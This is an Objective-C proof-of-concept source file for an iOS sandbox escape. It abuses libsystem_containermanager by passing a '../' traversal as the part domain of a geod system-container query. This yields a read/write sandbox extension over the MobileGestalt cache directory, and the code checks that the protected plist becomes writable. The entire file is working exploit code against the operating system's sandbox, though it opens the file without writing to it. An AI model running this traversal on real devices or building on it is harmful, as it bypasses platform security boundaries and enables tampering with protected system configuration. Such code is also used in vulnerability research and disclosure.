/*
 * Minimal MobileContainerManager class-12 geod traversal PoC.
 *
 * The code requests a read/write sandbox extension for the exact
 * MobileGestalt cache directory. It opens the live plist O_RDWR without
 * changing it. Use a separate transactional harness for mutation tests.
 */

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <stdbool.h>
#import <stdint.h>
#import <stdio.h>
#import <stdlib.h>
#import <unistd.h>
#import <xpc/xpc.h>

typedef void *container_query_t;
typedef void *container_object_t;

static NSString *NormalizePath(NSString *path)
{
    NSString *result = path.stringByStandardizingPath;
    if ([result isEqualToString:@"/var"] || [result hasPrefix:@"/var/"]) {
        result = [@"/private" stringByAppendingString:result];
    }
    return result;
}

static BOOL CanOpenReadWrite(NSString *path)
{
    int fd = open(path.fileSystemRepresentation,
                  O_RDWR | O_CLOEXEC | O_NOFOLLOW);
    if (fd < 0) {
        return NO;
    }
    close(fd);
    return YES;
}

int run_geod_mcm_poc(void)
{
    static NSString *const expectedDirectory =
        @"/private/var/containers/Shared/SystemGroup/"
         "systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    static NSString *const partDomain =
        @"../../../../../../containers/Shared/SystemGroup/"
         "systemgroup.com.apple.mobilegestaltcache/Library/Caches";

    void *lib = dlopen(
        "/usr/lib/system/libsystem_containermanager.dylib",
        RTLD_NOW | RTLD_LOCAL);
    if (lib == NULL) {
        return 1;
    }

    container_query_t (*query_create)(void) =
        dlsym(lib, "container_query_create");
    void (*query_set_class)(container_query_t, uint64_t) =
        dlsym(lib, "container_query_set_class");
    void (*query_set_ids)(container_query_t, xpc_object_t) =
        dlsym(lib, "container_query_set_identifiers");
    void (*query_set_flags)(container_query_t, uint64_t) =
        dlsym(lib, "container_query_operation_set_flags");
    void (*query_set_part)(container_query_t, uint64_t) =
        dlsym(lib, "container_query_operation_set_part");
    void (*query_set_part_domain)(container_query_t, const char *) =
        dlsym(lib, "container_query_operation_set_part_domain");
    container_object_t (*query_result)(container_query_t) =
        dlsym(lib, "container_query_get_single_result");
    void (*query_free)(container_query_t) =
        dlsym(lib, "container_query_free");
    container_object_t (*object_copy)(container_object_t) =
        dlsym(lib, "container_object_copy");
    void (*object_free)(container_object_t) =
        dlsym(lib, "container_object_free");
    const char *(*object_path)(container_object_t) =
        dlsym(lib, "container_object_get_path");
    char *(*copy_token)(container_object_t) =
        dlsym(lib, "container_copy_sandbox_token");
    bool (*activate)(container_object_t, bool) =
        dlsym(lib, "container_object_sandbox_extension_activate");

    if (query_create == NULL || query_set_class == NULL ||
        query_set_ids == NULL || query_set_flags == NULL ||
        query_set_part == NULL || query_set_part_domain == NULL ||
        query_result == NULL || query_free == NULL || object_copy == NULL ||
        object_free == NULL || object_path == NULL || copy_token == NULL ||
        activate == NULL) {
        dlclose(lib);
        return 2;
    }

    container_query_t query = query_create();
    if (query == NULL) {
        dlclose(lib);
        return 3;
    }

    query_set_class(query, 12);                 // system-data container
    xpc_object_t identifier = xpc_string_create("com.apple.geod");
    query_set_ids(query, identifier);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    query_set_flags(query, UINT64_C(0x8100000000));
    query_set_part(query, 3);                   // Library/Caches
    query_set_part_domain(query, partDomain.fileSystemRepresentation);

    container_object_t borrowed = query_result(query);
    container_object_t object = borrowed != NULL ? object_copy(borrowed) : NULL;
    if (object == NULL) {
        query_free(query);
        dlclose(lib);
        return 4;                               // denied or patched
    }

    const char *rawPath = object_path(object);
    NSString *returnedPath = rawPath != NULL
        ? [NSString stringWithUTF8String:rawPath] : nil;
    NSString *resolvedPath = NormalizePath(returnedPath ?: @"");
    BOOL exactDirectory = [resolvedPath isEqualToString:expectedDirectory];
    NSString *plist = [expectedDirectory stringByAppendingPathComponent:
        @"com.apple.MobileGestalt.plist"];
    BOOL deniedBefore = !CanOpenReadWrite(plist);

    char *token = exactDirectory ? copy_token(object) : NULL;
    size_t tokenLength = token != NULL ? strlen(token) : 0;
    free(token);
    BOOL activated = tokenLength != 0 && activate(object, false);
    BOOL writable = activated && CanOpenReadWrite(plist);

    object_free(object);                        // revoke the extension
    query_free(query);
    BOOL deniedAfter = !CanOpenReadWrite(plist);
    dlclose(lib);

    BOOL success = exactDirectory && deniedBefore && activated && writable &&
        deniedAfter;
    fprintf(stderr,
        "GEOD success=%d returned=%s resolved=%s token_length=%zu "
        "activated=%d writable=%d post_denied=%d\n",
        success, returnedPath.UTF8String ?: "(null)",
        resolvedPath.UTF8String ?: "(null)", tokenLength, activated,
        writable, deniedAfter);
    return success ? 0 : 5;
}
